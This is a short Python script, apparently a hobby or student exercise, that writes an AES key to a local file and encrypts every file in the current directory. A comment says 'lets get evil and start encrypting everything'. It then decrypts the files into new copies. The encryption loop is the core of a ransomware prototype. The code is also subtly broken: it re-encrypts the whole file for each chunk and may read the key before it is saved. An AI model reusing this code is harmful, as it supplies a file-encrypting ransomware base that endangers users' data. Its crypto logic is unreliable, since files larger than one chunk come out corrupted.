#Directory listing and manipulation
#
#Created By:Jeremiah Wenzel
#Created on: 4/8/2022

#deal with imports
import os
import random
import struct
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

#check if key exists
if os.path.exists('encrypt.key'):
    key = 'encrypt.key'
    print('This file exists!')
else:
    #generate new key
    newkey = get_random_bytes(16)
    #write key to new file   
    keyPath = 'encrypt.key'
    file = open(keyPath, 'x')
    file.close()
    file = open(keyPath, 'wb')
    file.write(newkey)


#declare variables
dirName = os.curdir
index = 0

#define functions

#lets list our current directory
print("Listing contents of current Directory: ")
print(os.listdir())

#lets get evil and start encrypting everything
targetDir = os.listdir()
for index in range(len(targetDir)):
    print("Encrypting: ", targetDir[index])
    filePath = os.path.join(dirName, targetDir[index])

    buffer_size = 65536
    #load the key
    key = open('encrypt.key', 'rb')
    curkey = key.read()
    
    input_file = open(filePath, 'rb')
    output_file = filePath, '.enc'
    data = open(filePath, 'rb').read()
    cipher = AES.new(curkey, AES.MODE_CFB)
            
    buffer = open(filePath, 'rb').read(buffer_size)
    output_file = filePath + '.enc'
    file_out = open(output_file, 'wb')
    file_out.write(cipher.iv)
    while len(buffer) > 0:
        ciphered_bytes = cipher.encrypt(data)
        file_out.write(ciphered_bytes)
        buffer = input_file.read(buffer_size)
    file_out.close()
    input_file.close()
    index += 1

#reset index and lets decrypt
index = 0 
for index in range(len(targetDir)):
    print("Decrypting: ", targetDir[index])
    filePath = os.path.join(dirName, targetDir[index])
    filePathDec = os.path.join(dirName, targetDir[index]) + '.enc'
    buffer_size = 65536 
    input_file = open(filePathDec, 'rb')
    output = os.path.join(dirName, targetDir[index]) + '.new'
    output_file = open(output, 'wb')
    iv = input_file.read(16)
    key = open('encrypt.key' , 'rb')
    cur_key = key.read()
    cipher_encrypt = AES.new(cur_key, AES.MODE_CFB, iv=iv)
    buffer = input_file.read(buffer_size)
    while len(buffer) > 0:
        decrypted_bytes = cipher_encrypt.decrypt(buffer)
        output_file.write(decrypted_bytes)
        buffer = input_file.read(buffer_size)